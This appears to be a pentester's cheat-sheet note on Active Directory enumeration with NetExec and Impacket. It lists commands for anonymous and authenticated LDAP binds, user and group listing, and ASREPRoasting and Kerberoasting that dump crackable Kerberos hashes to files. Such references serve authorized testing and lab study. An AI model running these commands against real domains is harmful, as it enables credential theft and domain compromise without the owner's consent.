---
title: AD LDAP Enum
type: note
tab: Active Directory
services: [LDAP, Kerberos]
tools: [nxc, impacket]
inputs: [Username, Password]
outputs: [Users, Groups, Hash]
tags: [ActiveDirectory, LDAP, Kerberos, Enumeration]
---

# AD LDAP Enum

#LDAP #ActiveDirectory #Enumeration
Test anonymous LDAP bind.

```sh
nxc ldap <DC_IP> -u '' -p ''
```

#Username #Password #LDAP #ActiveDirectory #Enumeration
Test authenticated LDAP access.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>'
```

#Username #Password #LDAP #ActiveDirectory #Enumeration
Enumerate users.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users
```

#Username #Password #LDAP #ActiveDirectory #Enumeration
Enumerate groups.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups
```

#Username #Password #LDAP #Kerberos #ActiveDirectory #Exploitation
ASREPRoast with NetExec.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt
```

#Username #Kerberos #ActiveDirectory #Exploitation
ASREPRoast with user list.

```sh
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -outputfile output.txt
```

#Username #Password #LDAP #Kerberos #ActiveDirectory #Exploitation
Kerberoast with NetExec.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt
```

#Username #Password #Kerberos #ActiveDirectory #Exploitation
Kerberoast with Impacket.

```sh
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -outputfile output.txt
```
